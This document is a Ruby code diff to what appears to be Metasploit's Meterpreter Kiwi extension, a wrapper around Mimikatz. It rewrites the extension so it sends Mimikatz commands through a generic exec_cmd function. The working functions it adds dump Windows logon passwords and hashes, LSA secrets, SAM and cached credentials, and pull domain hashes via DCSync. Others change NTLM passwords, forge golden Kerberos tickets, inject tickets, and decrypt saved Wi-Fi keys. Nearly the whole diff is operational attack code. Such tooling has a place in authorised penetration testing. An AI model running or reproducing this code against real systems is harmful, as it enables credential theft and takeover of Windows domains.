@@ -2,6 +2,7 @@
 
 require 'rex/post/meterpreter/extensions/kiwi/tlv'
 require 'rexml/document'
+require 'set'
 
 module Rex
 module Post
@@ -22,43 +23,6 @@ module Kiwi
 class Kiwi < Extension
 
   #
-  # These are constants that identify the type of credential to dump
-  # from the target machine.
-  #
-  PWD_ID_SEK_ALLPASS   = 0
-  PWD_ID_SEK_WDIGEST   = 1
-  PWD_ID_SEK_MSV       = 2
-  PWD_ID_SEK_KERBEROS  = 3
-  PWD_ID_SEK_TSPKG     = 4
-  PWD_ID_SEK_LIVESSP   = 5
-  PWD_ID_SEK_SSP       = 6
-  PWD_ID_SEK_DPAPI     = 7
-
-  #
-  # List of names which represent the flags that are part of the
-  # dumped kerberos tickets. The order of these is important. Each
-  # of them was pulled from the Mimikatz 2.0 source base.
-  #
-  KERBEROS_FLAGS = [
-    "NAME CANONICALIZE",
-    "<unknown>",
-    "OK AS DELEGATE",
-    "<unknown>",
-    "HW AUTHENT",
-    "PRE AUTHENT",
-    "INITIAL",
-    "RENEWABLE",
-    "INVALID",
-    "POSTDATED",
-    "MAY POSTDATE",
-    "PROXY",
-    "PROXIABLE",
-    "FORWARDED",
-    "FORWARDABLE",
-    "RESERVED"
-  ].map(&:freeze).freeze
-
-  #
   # Typical extension initialization routine.
   #
   # @param client (see Extension#initialize)
@@ -72,111 +36,314 @@ class Kiwi < Extension
           'ext'  => self
         },
       ])
+
+    # by default, we want all output in base64, so fire that up
+    # first so that everything uses this down the track
+    exec_cmd('"base64 /in:on /out:on"')
   end
 
-  #
-  # Dump the LSA secrets from the target machine.
-  #
-  # @return [Hash<Symbol,Object>]
-  def lsa_dump
-    request = Packet.create_request('kiwi_lsa_dump_secrets')
-
+  def exec_cmd(cmd)
+    request = Packet.create_request('kiwi_exec_cmd')
+    request.add_tlv(TLV_TYPE_KIWI_CMD, cmd)
     response = client.send_request(request)
+    output = response.get_tlv_value(TLV_TYPE_KIWI_CMD_RESULT)
+    # remove the banner up to the prompt
+    output = output[output.index('mimikatz(powershell) #') + 1, output.length]
+    # return everything past the newline from here
+    output[output.index("\n") + 1, output.length]
+  end
 
-    result = {
-      :major    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MAJ),
-      :minor    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MIN),
-      :compname => response.get_tlv_value(TLV_TYPE_KIWI_LSA_COMPNAME),
-      :syskey   => response.get_tlv_value(TLV_TYPE_KIWI_LSA_SYSKEY),
-      :nt5key   => response.get_tlv_value(TLV_TYPE_KIWI_LSA_NT5KEY),
-      :nt6keys  => [],
-      :secrets  => [],
-      :samkeys  => []
-    }
+  def password_change(opts)
+    cmd = "lsadump::changentlm /user:#{opts[:user]}"
+    cmd << " /server:#{opts[:server]}" if opts[:server]
+    cmd << " /oldpassword:#{opts[:old_pass]}" if opts[:old_pass]
+    cmd << " /oldntlm:#{opts[:old_hash]}" if opts[:old_hash]
+    cmd << " /newpassword:#{opts[:new_pass]}" if opts[:new_pass]
+    cmd << " /newntlm:#{opts[:new_hash]}" if opts[:new_hash]
 
-    response.each(TLV_TYPE_KIWI_LSA_NT6KEY) do |k|
-      result[:nt6keys] << {
-        :id    => k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYID),
-        :value => k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYVALUE)
-      }
+    output = exec_cmd("\"#{cmd}\"")
+    result = {}
+
+    if output =~ /^OLD NTLM\s+:\s+(\S+)\s*$/m
+      result[:old] = $1
+    end
+    if output =~ /^NEW NTLM\s+:\s+(\S+)\s*$/m
+      result[:new] = $1
     end
 
-    response.each(TLV_TYPE_KIWI_LSA_SECRET) do |s|
-      result[:secrets] << {
-        :name        => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NAME),
-        :service     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_SERV),
-        :ntlm        => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NTLM),
-        :current     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR),
-        :current_raw => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW),
-        :old         => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD),
-        :old_raw     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW)
-      }
-    end
-
-    response.each(TLV_TYPE_KIWI_LSA_SAM) do |s|
-      result[:samkeys] << {
-        :rid       => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_RID),
-        :user      => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_USER),
-        :ntlm_hash => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_NTLMHASH),
-        :lm_hash   => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_LMHASH)
-      }
+    if output =~ /^ERROR/m
+      result[:success] = false
+      if output =~ /^ERROR.*SamConnect/m
+        result[:error] = 'Invalid server.'
+      elsif output =~ /^ERROR.*Bad old/m
+        result[:error] = 'Invalid old password or hash.'
+      elsif output =~ /^ERROR.*SamLookupNamesInDomain/m
+        result[:error] = 'Invalid user.'
+      else
+        result[:error] = 'Unknown error.'
+      end
+    else
+      result[:success] = true
     end
 
     result
   end
 
-  #
-  # Convert a flag set to a list of string representations for the bit flags
-  # that are set.
-  #
-  # @param flags [Fixnum] Integer bitmask of Kerberos token flags.
-  #
-  # @return [Array<String>] Names of all set flags in +flags+. See
-  #   {KERBEROS_FLAGS}
-  def to_kerberos_flag_list(flags)
-    flags = flags >> 16
-    results = []
+  def dcsync(domain_user)
+    exec_cmd("\"lsadump::dcsync /user:#{domain_user}\"")
+  end
 
-    KERBEROS_FLAGS.each_with_index do |item, idx|
-      if (flags & (1 << idx)) != 0
-        results  << item
+  def dcsync_ntlm(domain_user)
+    result = {
+      ntlm: '<NOT FOUND>',
+      lm: '<NOT FOUND>',
+      sid: '<NOT FOUND>',
+      rid: '<NOT FOUND>'
+    }
+
+    output = dcsync(domain_user)
+    return nil unless output.include?('Object RDN')
+
+    output.lines.map(&:strip).each do |l|
+      if l.start_with?('Hash NTLM: ')
+        result[:ntlm] = l.split(' ')[-1]
+      elsif l.start_with?('lm  - 0:')
+        result[:lm] = l.split(' ')[-1]
+      elsif l.start_with?('Object Security ID')
+        result[:sid] = l.split(' ')[-1]
+      elsif l.start_with?('Object Relative ID')
+        result[:rid] = l.split(' ')[-1]
       end
     end
 
-    results
+    result
+  end
+
+  def lsa_dump_secrets
+    exec_cmd('lsadump::secrets')
+  end
+
+  def lsa_dump_sam
+    exec_cmd('lsadump::sam')
+  end
+
+  def lsa_dump_cache
+    exec_cmd('lsadump::cache')
+  end
+
+  def creds_ssp
+    { ssp: parse_ssp(exec_cmd('sekurlsa::ssp')) }
+  end
+
+  def creds_msv
+    { msv: parse_msv(exec_cmd('sekurlsa::msv')) }
+  end
+
+  def creds_wdigest
+    { wdigest: parse_wdigest(exec_cmd('sekurlsa::wdigest')) }
+  end
+
+  def creds_tspkg
+    { tspkg: parse_tspkg(exec_cmd('sekurlsa::tspkg')) }
+  end
+
+  def creds_kerberos
+    { kerberos: parse_kerberos(exec_cmd('sekurlsa::kerberos')) }
+  end
+
+  def creds_all
+    output = exec_cmd('sekurlsa::logonpasswords')
+    {
+      msv: parse_msv(output),
+      ssp: parse_ssp(output),
+      wdigest: parse_wdigest(output),
+      tspkg: parse_tspkg(output),
+      kerberos: parse_kerberos(output)
+    }
+  end
+
+  def parse_ssp(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an wdigest line
+      next if line !~ /\sssp\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      while line =~ /\[\d+\]/
+        line = lines.shift
+        # then the next 3 lines should be interesting
+        ssp = {}
+        3.times do
+          k, v = read_value(line)
+          ssp[k.strip] = v if k
+          line = lines.shift
+        end
+
+        if ssp.length > 0
+          results[ssp.values.join('|')] = ssp
+        end
+      end
+    end
+
+    results.values
+  end
+
+  def parse_wdigest(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an wdigest line
+      next if line !~ /\swdigest\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      next if line.blank? || line !~ /\s*\*/
+
+      # no, the next 3 lines should be interesting
+      wdigest = {}
+      3.times do
+        k, v = read_value(line)
+        wdigest[k.strip] = v if k
+        line = lines.shift
+      end
+
+      if wdigest.length > 0
+        results[wdigest.values.join('|')] = wdigest
+      end
+    end
+
+    results.values
+  end
+
+  def parse_tspkg(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an tspkg line
+      next if line !~ /\stspkg\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      next if line.blank? || line !~ /\s*\*/
+
+      # no, the next 3 lines should be interesting
+      tspkg = {}
+      3.times do
+        k, v = read_value(line)
+        tspkg[k.strip] = v if k
+        line = lines.shift
+      end
+
+      if tspkg.length > 0
+        results[tspkg.values.join('|')] = tspkg
+      end
+    end
+
+    results.values
+  end
+
+  def parse_kerberos(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an kerberos line
+      next if line !~ /\skerberos\s:/
+
+      line = lines.shift
+
+      # are there interesting values?
+      next if line.blank? || line !~ /\s*\*/
+
+      # no, the next 3 lines should be interesting
+      kerberos = {}
+      3.times do
+        k, v = read_value(line)
+        kerberos[k.strip] = v if k
+        line = lines.shift
+      end
+
+      if kerberos.length > 0
+        results[kerberos.values.join('|')] = kerberos
+      end
+    end
+
+    results.values
+  end
+
+  def parse_msv(output)
+    results = {}
+    lines = output.lines
+
+    while lines.length > 0 do
+      line = lines.shift
+
+      # search for an MSV line
+      next if line !~ /\smsv\s:/
+
+      line = lines.shift
+
+      # loop until we find the 'Primary' entry
+      while line !~ / Primary/ && !line.blank?
+        line = lines.shift
+      end
+
+      # did we find something?
+      next if line.blank?
+
+      msv = {}
+      # loop until we find a line that doesn't start with
+      # an asterisk, as this is the next credential set
+      loop do
+        line = lines.shift
+        if line.strip.start_with?('*')
+          k, v = read_value(line)
+          msv[k.strip] = v if k
+        else
+          lines.unshift(line)
+          break
+        end
+      end
+
+      if msv.length > 0
+        results[msv.values.join('|')] = msv
+      end
+    end
+
+    results.values
+  end
+
+  def read_value(line)
+    if line =~ /\s*\*\s([^:]*):\s(.*)/
+      return $1, $2
+    end
+
+    return nil, nil
   end
 
   #
   # List available kerberos tickets.
   #
-  # @param export [Bool] Set to +true+ to export the content of each ticket
+  # @return [String]
   #
-  # @return [Array<Hash>]
-  #
-  def kerberos_ticket_list(export)
-    export ||= false
-    request = Packet.create_request('kiwi_kerberos_ticket_list')
-    request.add_tlv(TLV_TYPE_KIWI_KERB_EXPORT, export)
-    response = client.send_request(request)
-
-    results = []
-
-    response.each(TLV_TYPE_KIWI_KERB_TKT) do |t|
-      results << {
-        :enc_type     => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_ENCTYPE),
-        :start        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_START),
-        :end          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_END),
-        :max_renew    => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_MAXRENEW),
-        :server       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERNAME),
-        :server_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_SERVERREALM),
-        :client       => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTNAME),
-        :client_realm => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_CLIENTREALM),
-        :flags        => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_FLAGS),
-        :raw          => t.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
-      }
-    end
-
-    results
+  def kerberos_ticket_list
+    exec_cmd('kerberos::list')
   end
 
   #
@@ -186,11 +353,9 @@ class Kiwi < Extension
   #
   # @return [void]
   #
-  def kerberos_ticket_use(ticket)
-    request = Packet.create_request('kiwi_kerberos_ticket_use')
-    request.add_tlv(TLV_TYPE_KIWI_KERB_TKT_RAW, ticket, false, true)
-    client.send_request(request)
-    return true
+  def kerberos_ticket_use(base64_ticket)
+    result = exec_cmd("\"kerberos::ptt #{base64_ticket}\"")
+    result.strip.end_with?(': OK')
   end
 
   #
@@ -199,37 +364,116 @@ class Kiwi < Extension
   # @return [void]
   #
   def kerberos_ticket_purge
-    request = Packet.create_request('kiwi_kerberos_ticket_purge')
-    client.send_request(request)
-    return true
+    result = exec_cmd('kerberos::purge').strip
+    'Ticket(s) purge for current session is OK' == result
   end
 
   #
   # Create a new golden kerberos ticket on the target machine and return it.
   #
-  # @param user [String] Name of the user to create the ticket for.
-  # @param domain [String] Domain name.
-  # @param sid [String] SID of the domain.
-  # @param tgt [String] The kerberos ticket granting token.
-  # @param id [Fixnum] ID of the user to grant the token for.
-  # @param group_ids [Array<Fixnum>] IDs of the groups to assign to the user
+  # @param opts[:user] [String] Name of the user to create the ticket for.
+  # @param opts[:domain_name] [String] Domain name.
+  # @param opts[:domain_sid] [String] SID of the domain.
+  # @param opts[:krbtgt_hash] [String] The kerberos ticket granting token.
+  # @param opts[:id] [Integer] ID of the user to grant the token for.
+  # @param opts[:group_ids] [Array<Integer>] IDs of the groups to assign to the user
   #
-  # @return [String]
+  # @return [Array<Byte>]
   #
-  def golden_ticket_create(user, domain, sid, tgt, id = 0, group_ids = [])
-    request = Packet.create_request('kiwi_kerberos_golden_ticket_create')
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_USER, user)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_DOMAIN, domain)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_SID, sid)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_TGT, tgt)
-    request.add_tlv(TLV_TYPE_KIWI_GOLD_USERID, id)
+  def golden_ticket_create(opts={})
+    cmd = [
+      "\"kerberos::golden /user:",
+      opts[:user],
+      " /domain:",
+      opts[:domain_name],
+      " /sid:",
+      opts[:domain_sid],
+      " /startoffset:0",
+      " /endin:",
+      opts[:end_in] * 60,
+      " /krbtgt:",
+      opts[:krbtgt_hash],
+      "\""
+    ].join('')
 
-    group_ids.each do |g|
-      request.add_tlv(TLV_TYPE_KIWI_GOLD_GROUPID, g)
+    if opts[:id]
+      cmd << " /id:" + opts[:id].to_s
     end
 
-    response = client.send_request(request)
-    return response.get_tlv_value(TLV_TYPE_KIWI_KERB_TKT_RAW)
+    if opts[:group_ids]
+      cmd << " /groups:" + opts[:group_ids]
+    end
+
+    output = exec_cmd(cmd)
+
+    return nil unless output.include?('Base64 of file')
+
+    saving = false
+    content = []
+    output.lines.map(&:strip).each do |l|
+      if l.start_with?('Base64 of file')
+        saving = true
+      elsif saving
+        if l.start_with?('====')
+          next if content.length == 0
+          break
+        end
+        content << l
+      end
+    end
+
+    content.join('')
+  end
+
+  #
+  # Access and parse a set of wifi profiles using the given interfaces
+  # list, which contains the list of profile xml files on the target.
+  #
+  # @return [Hash]
+  def wifi_parse_shared(wifi_interfaces)
+    results = []
+
+    exec_cmd('"base64 /in:off /out:on"')
+    wifi_interfaces.keys.each do |key|
+      interface = {
+        :guid     => key,
+        :desc     => nil,
+        :state    => nil,
+        :profiles => []
+      }
+
+      wifi_interfaces[key].each do |wifi_profile_path|
+        cmd = "\"dpapi::wifi /in:#{wifi_profile_path} /unprotect\""
+        output = exec_cmd(cmd)
+
+        lines = output.lines
+
+        profile = {
+          :name        => nil,
+          :auth        => nil,
+          :key_type    => nil,
+          :shared_key  => nil
+        }
+
+        while lines.length > 0 do
+          line = lines.shift.strip
+          if line =~ /^\* SSID name\s*: (.*)$/
+            profile[:name] = $1
+          elsif line =~ /^\* Authentication\s*: (.*)$/
+            profile[:auth] = $1
+          elsif line =~ /^\* Key Material\s*: (.*)$/
+            profile[:shared_key] = $1
+          end
+        end
+
+        interface[:profiles] << profile
+      end
+
+      results << interface
+    end
+    exec_cmd('"base64 /in:on /out:on"')
+
+    results
   end
 
   #
@@ -238,31 +482,25 @@ class Kiwi < Extension
   #
   # @return [Array<Hash>]
   def wifi_list
-    request = Packet.create_request('kiwi_wifi_profile_list')
-
-    response = client.send_request(request)
-
+    response_xml = exec_cmd('misc::wifi')
     results = []
+    # TODO: check for XXE?
+    doc = REXML::Document.new(response_xml)
 
-    response.each(TLV_TYPE_KIWI_WIFI_INT) do |i|
+    doc.get_elements('wifilist/interface').each do |i|
       interface = {
-        :guid     => Rex::Text::to_guid(i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_GUID)),
-        :desc     => i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_DESC),
-        :state    => i.get_tlv_value(TLV_TYPE_KIWI_WIFI_INT_STATE),
+        :guid     => Rex::Text::to_guid(i.elements['guid'].text),
+        :desc     => i.elements['description'].text,
+        :state    => i.elements['state'].text,
         :profiles => []
       }
 
-      i.each(TLV_TYPE_KIWI_WIFI_PROFILE) do |p|
-
-        xml = p.get_tlv_value(TLV_TYPE_KIWI_WIFI_PROFILE_XML)
-        doc = REXML::Document.new(xml)
-        profile = doc.elements['WLANProfile']
-
+      i.get_elements('profiles/WLANProfile').each do |p|
         interface[:profiles] << {
-          :name        => p.get_tlv_value(TLV_TYPE_KIWI_WIFI_PROFILE_NAME),
-          :auth        => profile.elements['MSM/security/authEncryption/authentication'].text,
-          :key_type    => profile.elements['MSM/security/sharedKey/keyType'].text,
-          :shared_key  => profile.elements['MSM/security/sharedKey/keyMaterial'].text
+          :name        => p.elements['name'].text,
+          :auth        => p.elements['MSM/security/authEncryption/authentication'].text,
+          :key_type    => p.elements['MSM/security/sharedKey/keyType'].text,
+          :shared_key  => p.elements['MSM/security/sharedKey/keyMaterial'].text
         }
       end
 
@@ -272,90 +510,6 @@ class Kiwi < Extension
     return results
   end
 
-  #
-  # Scrape passwords from the target machine.
-  #
-  # @param pwd_id [Fixnum] ID of the type credential to scrape.
-  #
-  # @return [Array<Hash>]
-  def scrape_passwords(pwd_id)
-    request = Packet.create_request('kiwi_scrape_passwords')
-    request.add_tlv(TLV_TYPE_KIWI_PWD_ID, pwd_id)
-    response = client.send_request(request)
-
-    results = []
-    response.each(TLV_TYPE_KIWI_PWD_RESULT) do |r|
-      results << {
-        :username => r.get_tlv_value(TLV_TYPE_KIWI_PWD_USERNAME),
-        :domain   => r.get_tlv_value(TLV_TYPE_KIWI_PWD_DOMAIN),
-        :password => r.get_tlv_value(TLV_TYPE_KIWI_PWD_PASSWORD),
-        :auth_hi  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_HI),
-        :auth_lo  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_LO),
-        :lm       => r.get_tlv_value(TLV_TYPE_KIWI_PWD_LMHASH),
-        :ntlm     => r.get_tlv_value(TLV_TYPE_KIWI_PWD_NTLMHASH)
-      }
-    end
-
-    return results
-  end
-
-  #
-  # Scrape all passwords from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def all_pass
-    scrape_passwords(PWD_ID_SEK_ALLPASS)
-  end
-
-  #
-  # Scrape wdigest credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def wdigest
-    scrape_passwords(PWD_ID_SEK_WDIGEST)
-  end
-
-  #
-  # Scrape msv credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def msv
-    scrape_passwords(PWD_ID_SEK_MSV)
-  end
-
-  #
-  # Scrape LiveSSP credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def livessp
-    scrape_passwords(PWD_ID_SEK_LIVESSP)
-  end
-
-  #
-  # Scrape SSP credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def ssp
-    scrape_passwords(PWD_ID_SEK_SSP)
-  end
-
-  #
-  # Scrape TSPKG credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def tspkg
-    scrape_passwords(PWD_ID_SEK_TSPKG)
-  end
-
-  #
-  # Scrape Kerberos credentials from the target machine.
-  #
-  # @return (see #scrape_passwords)
-  def kerberos
-    scrape_passwords(PWD_ID_SEK_KERBEROS)
-  end
-
 end
 
 end; end; end; end; end
-
